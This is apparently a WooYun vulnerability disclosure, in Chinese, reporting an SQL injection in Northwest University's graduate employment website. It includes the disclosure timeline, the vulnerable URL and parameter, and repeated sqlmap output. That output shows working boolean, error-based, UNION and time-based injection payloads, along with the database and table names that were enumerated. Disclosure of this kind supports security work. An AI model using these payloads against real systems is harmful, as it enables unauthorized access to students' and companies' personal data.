wybug_title: 西北大学毕业生就业信息网sql注入
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2014-08-25：	细节已通知厂商并且等待厂商处理中									2014-08-26：	厂商已经确认，细节仅向厂商公开									2014-09-05：	细节向核心白帽子及相关领域专家公开									2014-09-15：	细节向普通白帽子公开									2014-09-25：	细节向实习白帽子公开									2014-10-09：	细节向公众公开  简要描述： 西北大学毕业生就业信息网sql注入  详细说明：  http://jiuye.nwu.edu.cn/detail.jsp?id=2886 root权限 毕业生和公司信息 
web application technology: JSPback-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=2886' AND 7872=7872 AND 'CDML'='CDML    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=2886' AND (SELECT 2850 FROM(SELECT COUNT(*),CONCAT(0x71666b6971,(SELECT (CASE WHEN (2850=2850) THEN 1 ELSE 0 END)),0x7166767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Vkrm'='Vkrm    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: id=-2385' UNION ALL SELECT CONCAT(0x71666b6971,0x5753645769714a704a70,0x7166767a71),NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=2886' AND SLEEP(5) AND 'NqwH'='NqwH---web application technology: JSPback-end DBMS: MySQL 5.0available databases [4]:[*] centre[*] information_schema[*] mysql[*] test

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=2886' AND 7872=7872 AND 'CDML'='CDML    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=2886' AND (SELECT 2850 FROM(SELECT COUNT(*),CONCAT(0x71666b6971,(SELECT (CASE WHEN (2850=2850) THEN 1 ELSE 0 END)),0x7166767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Vkrm'='Vkrm    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: id=-2385' UNION ALL SELECT CONCAT(0x71666b6971,0x5753645769714a704a70,0x7166767a71),NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=2886' AND SLEEP(5) AND 'NqwH'='NqwH---web application technology: JSPback-end DBMS: MySQL 5.0Database: centre[6 tables]+--------------------+| centre_content     || centre_content_bak || centre_user        || company            || content            || student            |+--------------------+
   漏洞证明：  http://jiuye.nwu.edu.cn/detail.jsp?id=2886 root权限 毕业生和公司信息
